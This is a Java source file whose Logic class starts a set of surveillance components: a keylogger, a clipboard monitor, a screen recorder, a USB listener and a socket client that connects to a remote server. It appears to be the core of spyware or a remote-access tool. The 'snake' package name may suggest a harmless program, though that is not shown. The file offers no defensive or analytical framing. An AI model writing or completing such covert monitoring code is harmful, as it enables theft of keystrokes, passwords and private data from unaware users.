package snake.logic;

import java.io.IOException;
import java.net.URISyntaxException;

import org.jnativehook.NativeHookException;

import snake.logic.connection.SocketClient;
import snake.logic.model.Model;
import snake.logic.tools.ClipBoardMonitor;
import snake.logic.tools.KeyLogger;
import snake.logic.tools.Recorder;
import snake.logic.tools.USBListener;

public class Logic {
    private final Model model;
    private SocketClient socketClient;
    private USBListener usbListener;
    private ClipBoardMonitor clipBoardMonitor;
    private Recorder recorder;
    private KeyLogger keyLogger;

    public Logic() throws URISyntaxException, IOException {
        model = new Model();

        socketClient = new SocketClient(model);

        usbListener = new USBListener(model);
        keyLogger = new KeyLogger(model);
        clipBoardMonitor = new ClipBoardMonitor(1000, model);
        recorder = new Recorder(1, Recorder.P1080, model);
    } 

    public void start() throws IOException, NativeHookException {
        socketClient.connect();

        recorder.start();
        clipBoardMonitor.start();
        usbListener.start();
        keyLogger.start();
    }
}
